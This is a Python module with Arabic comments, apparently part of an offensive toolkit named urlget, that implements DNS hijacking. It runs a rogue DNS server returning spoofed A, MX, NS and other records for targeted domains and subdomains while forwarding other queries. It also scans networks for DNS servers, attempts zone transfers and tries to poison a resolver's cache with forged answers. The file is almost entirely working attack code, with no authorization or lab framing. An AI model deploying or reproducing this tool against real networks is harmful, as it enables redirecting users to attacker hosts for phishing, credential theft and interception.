#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
وحدة اختطاف نظام أسماء النطاقات (DNS) لأداة urlget
المؤلف: SayerLinux (SaudiLinux1@gmail.com)
الموقع: https://github.com/SaudiLinux
"""

import os
import sys
import time
import socket
import threading
import ipaddress
from datetime import datetime
import logging
import dns.resolver
import dns.message
import dns.rdatatype
import dns.rdataclass
import dns.query
import dns.zone
import dns.name
from dnslib import DNSRecord, DNSHeader, DNSQuestion, RR, QTYPE, A, AAAA, MX, NS, TXT, SOA
from dnslib.server import DNSServer, DNSHandler, BaseResolver

from urlget.utils import setup_logger, check_linux, check_root, save_results

class DNSHijacker:
    """فئة لتنفيذ هجمات اختطاف نظام أسماء النطاقات (DNS)"""
    
    def __init__(self, interface=None, ip=None, port=53, domains=None, log_file=None, verbose=False):
        """
        تهيئة فئة DNSHijacker
        
        المعلمات:
            interface (str): واجهة الشبكة للاستماع عليها
            ip (str): عنوان IP للاستماع عليه (إذا لم يتم تحديد واجهة)
            port (int): منفذ DNS للاستماع عليه (الافتراضي: 53)
            domains (list): قائمة بالنطاقات المستهدفة
            log_file (str): مسار ملف السجل
            verbose (bool): عرض معلومات تفصيلية
        """
        # التحقق من نظام التشغيل وصلاحيات الجذر
        if not check_linux():
            sys.exit("هذه الأداة تعمل فقط على نظام لينكس")
        
        if not check_root():
            sys.exit("يجب تشغيل هذه الأداة بصلاحيات الجذر (root)")
        
        self.logger = setup_logger("DNSHijacker", log_file, verbose)
        self.interface = interface
        self.ip = ip or self._get_interface_ip(interface) if interface else "0.0.0.0"
        self.port = port
        self.domains = domains or []
        self.spoof_records = {}
        self.dns_server = None
        self.running = False
        self.stats = {
            "requests": 0,
            "spoofed": 0,
            "forwarded": 0,
            "errors": 0
        }
        
        self.logger.info(f"تم تهيئة DNSHijacker على {self.ip}:{self.port}")
    
    def _get_interface_ip(self, interface):
        """الحصول على عنوان IP للواجهة المحددة"""
        try:
            import netifaces
            addresses = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addresses:
                return addresses[netifaces.AF_INET][0]['addr']
            return "0.0.0.0"
        except ImportError:
            self.logger.warning("لم يتم العثور على حزمة netifaces. استخدم pip install netifaces")
            return "0.0.0.0"
        except Exception as e:
            self.logger.error(f"خطأ في الحصول على عنوان IP للواجهة {interface}: {e}")
            return "0.0.0.0"
    
    def add_spoof_record(self, domain, record_type, value):
        """
        إضافة سجل DNS مزيف
        
        المعلمات:
            domain (str): النطاق المستهدف
            record_type (str): نوع السجل (A, AAAA, MX, NS, TXT, SOA)
            value (str): قيمة السجل
        """
        if domain not in self.spoof_records:
            self.spoof_records[domain] = {}
        
        record_type = record_type.upper()
        if record_type not in self.spoof_records[domain]:
            self.spoof_records[domain][record_type] = []
        
        self.spoof_records[domain][record_type].append(value)
        self.logger.info(f"تمت إضافة سجل مزيف: {domain} {record_type} {value}")
    
    def load_spoof_records_from_file(self, file_path):
        """
        تحميل سجلات DNS مزيفة من ملف
        
        تنسيق الملف:
        domain,record_type,value
        
        المعلمات:
            file_path (str): مسار ملف السجلات المزيفة
        """
        try:
            with open(file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    parts = line.split(',')
                    if len(parts) != 3:
                        self.logger.warning(f"تنسيق غير صالح في الملف: {line}")
                        continue
                    
                    domain, record_type, value = parts
                    self.add_spoof_record(domain, record_type, value)
            
            self.logger.info(f"تم تحميل سجلات DNS المزيفة من {file_path}")
        except Exception as e:
            self.logger.error(f"خطأ في تحميل سجلات DNS المزيفة: {e}")
    
    class DNSHijackResolver(BaseResolver):
        """محلل DNS مخصص للاختطاف"""
        
        def __init__(self, hijacker):
            """
            تهيئة محلل DNS
            
            المعلمات:
                hijacker (DNSHijacker): مرجع لكائن DNSHijacker
            """
            self.hijacker = hijacker
            self.upstream_resolver = dns.resolver.Resolver()
        
        def resolve(self, request, handler):
            """
            حل طلب DNS
            
            المعلمات:
                request (DNSRecord): طلب DNS
                handler (DNSHandler): معالج DNS
            
            العائد:
                DNSRecord: استجابة DNS
            """
            reply = request.reply()
            qname = str(request.q.qname).lower().rstrip('.')
            qtype = QTYPE[request.q.qtype]
            
            self.hijacker.stats["requests"] += 1
            self.hijacker.logger.debug(f"طلب DNS: {qname} {qtype}")
            
            # التحقق مما إذا كان النطاق في قائمة السجلات المزيفة
            if qname in self.hijacker.spoof_records and qtype in self.hijacker.spoof_records[qname]:
                for value in self.hijacker.spoof_records[qname][qtype]:
                    self._add_record_to_reply(reply, qname, qtype, value)
                
                self.hijacker.stats["spoofed"] += 1
                self.hijacker.logger.info(f"تم اختطاف: {qname} {qtype}")
                return reply
            
            # التحقق من النطاقات الفرعية
            for domain in self.hijacker.spoof_records:
                if qname.endswith(f".{domain}") or qname == domain:
                    if qtype in self.hijacker.spoof_records[domain]:
                        for value in self.hijacker.spoof_records[domain][qtype]:
                            self._add_record_to_reply(reply, qname, qtype, value)
                        
                        self.hijacker.stats["spoofed"] += 1
                        self.hijacker.logger.info(f"تم اختطاف (نطاق فرعي): {qname} {qtype}")
                        return reply
            
            # إعادة توجيه الطلب إلى خادم DNS الأصلي
            try:
                upstream_query = dns.message.make_query(qname, dns.rdatatype.from_text(qtype))
                upstream_response = dns.query.udp(upstream_query, self.upstream_resolver.nameservers[0], timeout=3)
                
                # تحويل استجابة dns.message إلى DNSRecord
                response_bytes = upstream_response.to_wire()
                dnslib_response = DNSRecord.parse(response_bytes)
                
                self.hijacker.stats["forwarded"] += 1
                self.hijacker.logger.debug(f"تم إعادة توجيه: {qname} {qtype}")
                return dnslib_response
            except Exception as e:
                self.hijacker.stats["errors"] += 1
                self.hijacker.logger.error(f"خطأ في إعادة توجيه طلب DNS: {e}")
                return reply
        
        def _add_record_to_reply(self, reply, qname, qtype, value):
            """
            إضافة سجل إلى استجابة DNS
            
            المعلمات:
                reply (DNSRecord): استجابة DNS
                qname (str): اسم النطاق
                qtype (str): نوع السجل
                value (str): قيمة السجل
            """
            try:
                if qtype == 'A':
                    reply.add_answer(RR(qname, QTYPE.A, rdata=A(value)))
                elif qtype == 'AAAA':
                    reply.add_answer(RR(qname, QTYPE.AAAA, rdata=AAAA(value)))
                elif qtype == 'MX':
                    priority, mx_value = value.split(' ', 1)
                    reply.add_answer(RR(qname, QTYPE.MX, rdata=MX(int(priority), mx_value)))
                elif qtype == 'NS':
                    reply.add_answer(RR(qname, QTYPE.NS, rdata=NS(value)))
                elif qtype == 'TXT':
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(value)))
                elif qtype == 'SOA':
                    parts = value.split(' ')
                    if len(parts) >= 7:
                        mname, rname, serial, refresh, retry, expire, minimum = parts
                        reply.add_answer(RR(qname, QTYPE.SOA, rdata=SOA(
                            mname, rname, int(serial), int(refresh), int(retry), int(expire), int(minimum)
                        )))
            except Exception as e:
                self.hijacker.logger.error(f"خطأ في إضافة سجل {qtype} لـ {qname}: {e}")
    
    def start(self):
        """بدء خادم DNS المخصص"""
        if self.running:
            self.logger.warning("خادم DNS قيد التشغيل بالفعل")
            return
        
        try:
            resolver = self.DNSHijackResolver(self)
            self.dns_server = DNSServer(resolver, port=self.port, address=self.ip)
            
            server_thread = threading.Thread(target=self.dns_server.start)
            server_thread.daemon = True
            server_thread.start()
            
            self.running = True
            self.logger.info(f"تم بدء خادم DNS على {self.ip}:{self.port}")
            
            # عرض الإحصائيات بشكل دوري
            stats_thread = threading.Thread(target=self._print_stats)
            stats_thread.daemon = True
            stats_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"خطأ في بدء خادم DNS: {e}")
            return False
    
    def stop(self):
        """إيقاف خادم DNS المخصص"""
        if not self.running:
            self.logger.warning("خادم DNS ليس قيد التشغيل")
            return
        
        try:
            self.dns_server.stop()
            self.running = False
            self.logger.info("تم إيقاف خادم DNS")
            return True
        except Exception as e:
            self.logger.error(f"خطأ في إيقاف خادم DNS: {e}")
            return False
    
    def _print_stats(self):
        """طباعة إحصائيات خادم DNS بشكل دوري"""
        while self.running:
            self.logger.info(f"إحصائيات DNS - طلبات: {self.stats['requests']}, "
                           f"مختطفة: {self.stats['spoofed']}, "
                           f"معاد توجيهها: {self.stats['forwarded']}, "
                           f"أخطاء: {self.stats['errors']}")
            time.sleep(10)
    
    def scan_network_dns(self, target_network, timeout=1):
        """
        مسح الشبكة للبحث عن خوادم DNS
        
        المعلمات:
            target_network (str): الشبكة المستهدفة (مثل 192.168.1.0/24)
            timeout (int): مهلة الاتصال بالثواني
        
        العائد:
            list: قائمة بخوادم DNS المكتشفة
        """
        dns_servers = []
        network = ipaddress.ip_network(target_network)
        
        self.logger.info(f"بدء مسح الشبكة {target_network} للبحث عن خوادم DNS...")
        
        for ip in network.hosts():
            ip_str = str(ip)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((ip_str, 53))
                if result == 0:
                    # التحقق مما إذا كان يستجيب لطلبات DNS
                    try:
                        resolver = dns.resolver.Resolver()
                        resolver.nameservers = [ip_str]
                        resolver.timeout = timeout
                        resolver.lifetime = timeout
                        
                        answers = resolver.resolve("google.com", "A")
                        dns_servers.append(ip_str)
                        self.logger.info(f"تم اكتشاف خادم DNS: {ip_str}")
                    except:
                        pass
                sock.close()
            except:
                pass
        
        self.logger.info(f"اكتمل المسح. تم العثور على {len(dns_servers)} خادم DNS")
        return dns_servers
    
    def zone_transfer(self, domain, nameserver):
        """
        محاولة نقل منطقة DNS
        
        المعلمات:
            domain (str): النطاق المستهدف
            nameserver (str): خادم الأسماء للاتصال به
        
        العائد:
            dict: قاموس بسجلات DNS المستردة
        """
        results = {}
        
        try:
            self.logger.info(f"محاولة نقل منطقة DNS لـ {domain} من {nameserver}...")
            zone = dns.zone.from_xfr(dns.query.xfr(nameserver, domain))
            
            for name, node in zone.nodes.items():
                name_str = str(name)
                if name_str == '@':
                    name_str = domain
                elif name_str != '@':
                    name_str = f"{name_str}.{domain}"
                
                for rdataset in node.rdatasets:
                    record_type = dns.rdatatype.to_text(rdataset.rdtype)
                    for rdata in rdataset:
                        if name_str not in results:
                            results[name_str] = {}
                        
                        if record_type not in results[name_str]:
                            results[name_str][record_type] = []
                        
                        results[name_str][record_type].append(str(rdata))
            
            self.logger.info(f"نقل منطقة DNS ناجح لـ {domain}. تم استرداد {len(results)} سجل")
        except Exception as e:
            self.logger.error(f"فشل نقل منطقة DNS لـ {domain} من {nameserver}: {e}")
        
        return results
    
    def dns_cache_poisoning(self, target_domain, spoof_ip, nameserver, attempts=100):
        """
        محاولة تسميم ذاكرة التخزين المؤقت لـ DNS
        
        المعلمات:
            target_domain (str): النطاق المستهدف
            spoof_ip (str): عنوان IP المزيف
            nameserver (str): خادم الأسماء المستهدف
            attempts (int): عدد المحاولات
        
        العائد:
            bool: نجاح أو فشل الهجوم
        """
        self.logger.info(f"بدء هجوم تسميم ذاكرة التخزين المؤقت لـ DNS على {nameserver} لـ {target_domain}...")
        
        # إنشاء معرف عشوائي للطلب
        import random
        query_id = random.randint(1, 65535)
        
        # إنشاء طلب DNS
        request = dns.message.make_query(
            target_domain, dns.rdatatype.A, id=query_id
        )
        
        # إنشاء استجابة DNS مزيفة
        response = dns.message.make_response(request)
        response.set_rcode(dns.rcode.NOERROR)
        
        # إضافة سجل A مزيف
        rrset = dns.rrset.from_text(
            target_domain, 300, dns.rdataclass.IN, dns.rdatatype.A, spoof_ip
        )
        response.answer.append(rrset)
        
        # إرسال الطلب والاستجابة المزيفة
        success = False
        for i in range(attempts):
            try:
                # إرسال الطلب
                dns.query.udp(request, nameserver, timeout=1)
                
                # إرسال الاستجابة المزيفة
                dns.query.udp(response, nameserver, timeout=1)
                
                # التحقق من نجاح الهجوم
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [nameserver]
                resolver.timeout = 1
                resolver.lifetime = 1
                
                answers = resolver.resolve(target_domain, "A")
                for rdata in answers:
                    if str(rdata) == spoof_ip:
                        success = True
                        self.logger.info(f"نجح هجوم تسميم ذاكرة التخزين المؤقت لـ DNS بعد {i+1} محاولة")
                        break
            except Exception as e:
                pass
            
            if success:
                break
        
        if not success:
            self.logger.warning(f"فشل هجوم تسميم ذاكرة التخزين المؤقت لـ DNS بعد {attempts} محاولة")
        
        return success
    
    def save_results(self, output_file):
        """
        حفظ نتائج اختطاف DNS
        
        المعلمات:
            output_file (str): مسار ملف الإخراج
        """
        results = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "server": f"{self.ip}:{self.port}",
            "stats": self.stats,
            "spoof_records": self.spoof_records
        }
        
        save_results(results, output_file)
        self.logger.info(f"تم حفظ نتائج اختطاف DNS في {output_file}")


def main(args=None):
    """
    النقطة الرئيسية لتشغيل وحدة اختطاف DNS
    
    المعلمات:
        args (Namespace): وسائط سطر الأوامر
    """
    if args is None:
        return
    
    hijacker = DNSHijacker(
        interface=args.interface,
        ip=args.ip,
        port=args.port,
        domains=args.domains,
        log_file=args.log,
        verbose=args.verbose
    )
    
    # تحميل سجلات DNS المزيفة
    if args.spoof_file:
        hijacker.load_spoof_records_from_file(args.spoof_file)
    
    # إضافة سجلات DNS المزيفة من وسائط سطر الأوامر
    if args.spoof:
        for spoof in args.spoof:
            parts = spoof.split(',')
            if len(parts) == 3:
                domain, record_type, value = parts
                hijacker.add_spoof_record(domain, record_type, value)
    
    # تنفيذ العمليات المطلوبة
    if args.scan_network:
        dns_servers = hijacker.scan_network_dns(args.scan_network, args.timeout)
        if args.output:
            with open(args.output, 'w') as f:
                f.write("# خوادم DNS المكتشفة\n")
                for server in dns_servers:
                    f.write(f"{server}\n")
    
    elif args.zone_transfer:
        results = hijacker.zone_transfer(args.zone_transfer, args.nameserver)
        if args.output:
            save_results(results, args.output)
    
    elif args.cache_poisoning:
        success = hijacker.dns_cache_poisoning(
            args.cache_poisoning, args.spoof_ip, args.nameserver, args.attempts
        )
        if args.output:
            save_results({"success": success}, args.output)
    
    else:
        # بدء خادم DNS
        if hijacker.start():
            try:
                print("خادم DNS قيد التشغيل. اضغط Ctrl+C للإيقاف...")
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\nإيقاف خادم DNS...")
                hijacker.stop()
                if args.output:
                    hijacker.save_results(args.output)


if __name__ == "__main__":
    print("هذا الملف مخصص للاستيراد وليس للتشغيل المباشر")